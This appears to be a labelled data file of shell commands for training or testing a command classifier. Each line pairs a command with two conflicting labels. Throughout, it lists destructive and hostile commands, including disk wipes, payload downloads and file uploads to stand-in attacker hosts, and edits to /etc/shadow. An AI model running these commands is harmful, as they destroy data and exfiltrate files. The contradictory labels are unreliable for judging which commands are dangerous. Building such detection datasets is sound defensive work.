+grep root /etc/passwd,MALICIOUS,BENIGN
+iptables   -F,SUSPICIOUS,MALICIOUS
+rm -rf /,MALICIOUS,BENIGN
+ CAT WELCOME.TXT,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+cat /var/log/auth.log,BENIGN,SUSPICIOUS
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+env,SUSPICIOUS,MALICIOUS
+echo 'hello world',SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+scp file.txt   admin@backup.server:/var/www,MALICIOUS,BENIGN
+top -n   1,MALICIOUS,BENIGN
+echo 'owned' >> /root/.bashrc,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+ls /root/ ,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+ rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,SUSPICIOUS
+RM   -RF /HOME/USER,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,BENIGN
+curl https://evil.com/payload.sh ,MALICIOUS,SUSPICIOUS
+touch homework.doc,MALICIOUS,BENIGN
+ cat notes.txt,MALICIOUS,BENIGN
+cat   /root/.bashrc,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,MALICIOUS
+echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,BENIGN,MALICIOUS
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+sudo   su,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh ,SUSPICIOUS,MALICIOUS
+cd /root/,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+ IPTABLES -F,SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,SUSPICIOUS
+PS AUX,MALICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
+curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+echo 'hello world' ,BENIGN,SUSPICIOUS
+TOUCH HOMEWORK.DOC,MALICIOUS,SUSPICIOUS
+which python,MALICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+ls   /tmp/,MALICIOUS,BENIGN
+ifconfig,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+iptables   -F,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh ,MALICIOUS,SUSPICIOUS
+pwd,SUSPICIOUS,BENIGN
+curl https://evil.com/update.bin,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+echo   'hello world',SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+du -sh ,SUSPICIOUS,BENIGN
+rm -rf /home/user,SUSPICIOUS,BENIGN
+curl -O   http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+which   python,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+ ls /root/,BENIGN,MALICIOUS
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat   /root/.bashrc,MALICIOUS,BENIGN
+SUDO APT INSTALL NMAP,MALICIOUS,SUSPICIOUS
+cd /var/www,MALICIOUS,BENIGN
+mkdir test ,SUSPICIOUS,BENIGN
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+cat /home/user/todo.txt,BENIGN,MALICIOUS
+sudo apt install net-tools,BENIGN,MALICIOUS
+cd /tmp/,BENIGN,MALICIOUS
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+WATCH NETSTAT -AN ,MALICIOUS,SUSPICIOUS
+rm -rf /,MALICIOUS,BENIGN
+rm -rf   /,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+ cat welcome.txt,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,MALICIOUS
+ping google.com,MALICIOUS,BENIGN
+rm -rf   /* --no-preserve-root,MALICIOUS,BENIGN
+whoami ,SUSPICIOUS,BENIGN
+du -sh,BENIGN,MALICIOUS
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh ,SUSPICIOUS,BENIGN
+ SUDO -L,MALICIOUS,SUSPICIOUS
+cat /etc/passwd,MALICIOUS,BENIGN
+env,MALICIOUS,SUSPICIOUS
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc ,MALICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+chmod   777 /root/.bashrc,SUSPICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc ,BENIGN,SUSPICIOUS
+curl https://evil.com/payload.sh,MALICIOUS,BENIGN
+ wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+ RM -RF /,MALICIOUS,SUSPICIOUS
+rm -rf /var/ ,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,BENIGN,MALICIOUS
+ps aux,MALICIOUS,BENIGN
+rm   -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+ifconfig,BENIGN,SUSPICIOUS
+cd /var/www,MALICIOUS,SUSPICIOUS
+cat welcome.txt,MALICIOUS,BENIGN
+ wget http://evil.com/payload.sh,BENIGN,SUSPICIOUS
+CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,SUSPICIOUS,BENIGN
+ECHO 'OWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
+CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+sudo apt install net-tools,MALICIOUS,BENIGN
+IFCONFIG ,SUSPICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,MALICIOUS
+ls /tmp/,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+ps aux | grep mysql ,MALICIOUS,BENIGN
+PS AUX | GREP MYSQL ,SUSPICIOUS,BENIGN
+WATCH NETSTAT -AN,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+sudo apt install nmap,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+cat   readme.md,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+scp data.tar.gz root@malicious.com:/root/,SUSPICIOUS,BENIGN
+curl   https://safe-site.org/update.sh,MALICIOUS,SUSPICIOUS
+rm -rf /,MALICIOUS,BENIGN
+iptables -F ,SUSPICIOUS,BENIGN
+cat homework.txt ,BENIGN,SUSPICIOUS
+cat   /var/log/syslog,MALICIOUS,BENIGN
+find / -name 'test' ,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,SUSPICIOUS
+ wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
+rm -rf /home/user,BENIGN,SUSPICIOUS
+curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+ssh -L   8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+cat   /var/log/syslog,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,MALICIOUS
+grep 'password'   /etc/passwd,BENIGN,SUSPICIOUS
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+CAT   /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
+cd /root/ ,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+ps aux | grep mysql,MALICIOUS,SUSPICIOUS
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,BENIGN,SUSPICIOUS
+watch netstat -an,MALICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+du -sh ,MALICIOUS,SUSPICIOUS
+cat /etc/shadow,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+rm -rf / ,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+cat   homework.txt,SUSPICIOUS,MALICIOUS
+cat readme.md,MALICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+ps   aux,SUSPICIOUS,BENIGN
+grep root /etc/passwd,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,SUSPICIOUS,MALICIOUS
+curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+uname -a,BENIGN,SUSPICIOUS
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+which   python,SUSPICIOUS,MALICIOUS
+ECHO   'PWNED' >> /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
+CAT /ETC/PASSWD,MALICIOUS,BENIGN
+echo 'hacked'   >> /root/.bashrc,MALICIOUS,BENIGN
+CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+ wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,MALICIOUS
+cat   /root/.bashrc,SUSPICIOUS,BENIGN
+cat /var/log/syslog,BENIGN,MALICIOUS
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
+ curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,SUSPICIOUS
+CD /TMP/,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts ,MALICIOUS,SUSPICIOUS
+cat .bashrc,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+rm   -rf /,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
+grep root /etc/passwd,BENIGN,MALICIOUS
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+SUDO -L,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+scp backup.sql   admin@backup.server:/var/www,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,MALICIOUS
+RM -RF /VAR/,MALICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,BENIGN,MALICIOUS
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+touch   homework.doc,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd ,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd ,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+wget http://evil.com/payload.sh,SUSPICIOUS,BENIGN
+scp file.txt root@backup.server:/root/,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,MALICIOUS
+scp backup.sql root@backup.server:/var/www,SUSPICIOUS,BENIGN
+CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS,BENIGN
+ps aux | grep nginx,MALICIOUS,BENIGN
+DF -H,BENIGN,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
+ls /var/www,BENIGN,SUSPICIOUS
+cat /var/log/auth.log,BENIGN,SUSPICIOUS
+cat notes.txt,BENIGN,MALICIOUS
+watch netstat -an,SUSPICIOUS,MALICIOUS
+ls /var/www,MALICIOUS,BENIGN
+ cat /etc/shadow,SUSPICIOUS,BENIGN
+ chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+ dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+touch   homework.doc,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+ cat /etc/shadow,SUSPICIOUS,BENIGN
+ which python,SUSPICIOUS,BENIGN
+rm -rf / ,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+ sudo apt install net-tools,MALICIOUS,BENIGN
+sudo su ,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,SUSPICIOUS
+netstat -tulnp,SUSPICIOUS,MALICIOUS
+df   -h,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+SUDO APT UPDATE,BENIGN,MALICIOUS
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+wget http://fileshare.com/payload.sh,MALICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+SUDO APT INSTALL HTOP ,SUSPICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+ DU -SH,SUSPICIOUS,BENIGN
+chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
+curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
+ps aux | grep sshd,BENIGN,SUSPICIOUS
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+echo 'hacked' >> /etc/shadow,BENIGN,MALICIOUS
+df -h,MALICIOUS,BENIGN
+ps aux | grep sshd,BENIGN,SUSPICIOUS
+which python,BENIGN,SUSPICIOUS
+grep root /etc/passwd,MALICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+cat   /home/user/info.txt,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,MALICIOUS
+sudo su,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,SUSPICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,MALICIOUS,BENIGN
+ps aux   | grep sshd,SUSPICIOUS,BENIGN
+ls -al,BENIGN,SUSPICIOUS
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+CAT /HOME/USER/TODO.TXT,MALICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+cat   /root/.bashrc,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+ pwd,MALICIOUS,BENIGN
+echo 'hacked' >   /var/log/syslog,BENIGN,MALICIOUS
+ curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+netstat -tulnp,BENIGN,SUSPICIOUS
+find / -name 'test',SUSPICIOUS,BENIGN
+echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+sudo apt install nmap,BENIGN,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+ curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+ echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+CAT   /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+pwd,MALICIOUS,SUSPICIOUS
+sudo apt install net-tools,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,BENIGN,SUSPICIOUS
+uname -a,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,SUSPICIOUS
+ls -al,MALICIOUS,BENIGN
+env,SUSPICIOUS,MALICIOUS
+sudo apt update,SUSPICIOUS,BENIGN
+scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+mkdir   test,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+wget http://evil.com/payload.sh,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,BENIGN
+history ,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+uname -a,BENIGN,MALICIOUS
+sudo su,MALICIOUS,BENIGN
+iptables   -F,MALICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+scp file.txt   attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+rm -rf   /,SUSPICIOUS,MALICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+ sudo apt install net-tools,MALICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
+curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+cat   /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+iptables   -F,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+cd   /tmp/,MALICIOUS,SUSPICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+ du -sh,SUSPICIOUS,BENIGN
+echo   'hacked' >> /root/.bashrc,MALICIOUS,SUSPICIOUS
+cd /root,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+curl   https://evil.com/update.bin,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+sudo apt install nmap,SUSPICIOUS,BENIGN
+cat /home/user/info.txt ,SUSPICIOUS,MALICIOUS
+cat /var/log/syslog,BENIGN,MALICIOUS
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,BENIGN,SUSPICIOUS
+FIND / -NAME 'TEST',MALICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+sudo -l,MALICIOUS,SUSPICIOUS
+rm -rf   /home/user,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,MALICIOUS
+netstat -tulnp,MALICIOUS,BENIGN
+CURL   HTTPS://SAFE-SITE.ORG/UPDATE.SH,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+rm -rf /var/,BENIGN,MALICIOUS
+ps aux,MALICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+ cat /var/log/auth.log,SUSPICIOUS,BENIGN
+watch   netstat -an,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,SUSPICIOUS
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,MALICIOUS
+find / -name 'test',BENIGN,MALICIOUS
+mkdir test,MALICIOUS,SUSPICIOUS
+cat /etc/shadow ,MALICIOUS,BENIGN
+ECHO   'HACKED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+uname   -a,MALICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+scp file.txt user@malicious.com:/root/,SUSPICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+curl   -o http://fileshare.com/payload.sh,MALICIOUS,SUSPICIOUS
+chmod   777 /etc/shadow,MALICIOUS,BENIGN
+curl   -O http://suspicious.org/payload.sh,BENIGN,MALICIOUS
+echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
+cat /var/log/auth.log ,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+CAT   /VAR/LOG/AUTH.LOG,MALICIOUS,BENIGN
+CURL   HTTPS://EVIL.COM/EXPLOIT.ZIP,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,MALICIOUS
+history,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+wget http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+cat /etc/shadow,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow ,MALICIOUS,BENIGN
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+scp file.txt root@backup.server:/tmp/,MALICIOUS,BENIGN
+FIND / -NAME   'TEST',SUSPICIOUS,BENIGN
+which   python,MALICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin ,SUSPICIOUS,BENIGN
+CD /TMP/,MALICIOUS,SUSPICIOUS
+rm -rf /* --no-preserve-root,SUSPICIOUS,MALICIOUS
+ping google.com,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
